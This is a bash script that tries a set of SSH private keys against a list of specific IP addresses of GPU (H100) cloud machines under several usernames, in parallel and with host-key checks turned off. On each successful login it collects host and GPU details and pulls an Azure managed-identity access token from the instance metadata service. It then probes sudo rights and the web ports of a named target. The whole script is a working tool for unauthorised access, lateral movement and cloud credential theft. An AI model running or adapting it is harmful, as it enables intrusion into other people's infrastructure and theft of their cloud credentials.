#!/bin/bash
# ul h100 ladder - publickey matrix from GitHub-hosted runner
set +e
mkdir -p out
SSHOPT="-o BatchMode=yes -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=8 -o LogLevel=ERROR -o PreferredAuthentications=publickey"

try() {
  k="$1"; u="$2"; ip="$3"
  out=$(timeout 30 ssh -i "$k" $SSHOPT "$u@$ip" 'echo LOGIN_OK; id; hostname; hostname -I; nvidia-smi -L 2>/dev/null; nvidia-smi --query-gpu=index,name,memory.total,serial,uuid,driver_version --format=csv,noheader 2>/dev/null' 2>&1)
  echo "TRY $u@$ip $(basename "$k") :: $(echo "$out" | head -1 | cut -c1-140)"
  case "$out" in
    *LOGIN_OK*)
      echo "HIT $u@$ip $(basename "$k")" >> out/hits.txt
      echo "=== $u@$ip $(basename "$k") ===" >> out/hits.txt
      echo "$out" >> out/hits.txt
      timeout 25 ssh -i "$k" $SSHOPT "$u@$ip" 'curl -s -m 10 -H "Metadata: true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"' > "out/imds_${ip}_${u}.json" 2>&1
      timeout 25 ssh -i "$k" $SSHOPT "$u@$ip" 'curl -s -m 10 -H "Metadata: true" "http://169.254.169.254/metadata/instance?api-version=2021-02-01"' > "out/inst_${ip}_${u}.json" 2>&1
      timeout 25 ssh -i "$k" $SSHOPT "$u@$ip" 'sudo -n id 2>/dev/null; head -2 /etc/os-release 2>/dev/null; ls /dev/nvidia* 2>/dev/null | head; ls /opt 2>/dev/null | head' > "out/env_${ip}_${u}.txt" 2>&1
      ;;
  esac
}
export SSHOPT
export -f try

K0=$(ls k | head -1)
echo "egress=$(curl -s -m 10 https://ifconfig.me)"
echo "keys=$(ls k | wc -l) k0=$K0"

# negative control: truncated key must be refused
head -3 "k/$K0" > out/badkey
printf -- '-----END OPENSSH PRIVATE KEY-----\n' >> out/badkey
chmod 600 out/badkey
timeout 20 ssh -i out/badkey $SSHOPT t19@70.153.141.118 'echo CONTROL_FAIL_BAD' 2>&1 | head -2 | sed 's/^/CTL /'

cut -f2 hosts.tsv 2>/dev/null | grep -E '^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$' > h100ips.txt
printf '70.153.141.118\n23.100.38.120\n20.114.255.207\n' >> h100ips.txt
sort -u h100ips.txt -o h100ips.txt
echo "ips=$(wc -l < h100ips.txt)"

# Phase A: azadmin key across the fleet
for ip in $(cat h100ips.txt); do for u in t19 azureuser ubuntu root; do echo "k/$K0 $u $ip"; done; done | xargs -P 16 -n 3 bash -c 'try "$@"' _

# Phase B: full key set against the three graph H100 hosts
for kk in k/*; do for ip in 70.153.141.118 20.114.255.207 23.100.38.120; do for u in t19 azureuser ul ubuntu root; do echo "$kk $u $ip"; done; done; done | xargs -P 16 -n 3 bash -c 'try "$@"' _

# Phase C: http side of the target
for p in 80 443 8000 8888 8265; do
  echo "HTTP $p :: $(timeout 12 curl -sk -m 10 -o /dev/null -w '%{http_code} %{size_download} %{content_type} %{redirect_url}' https://70.153.141.118:$p/ 2>&1)"
done > out/http.txt
cat out/http.txt
echo "hits=$(wc -l < out/hits.txt 2>/dev/null || echo 0)"
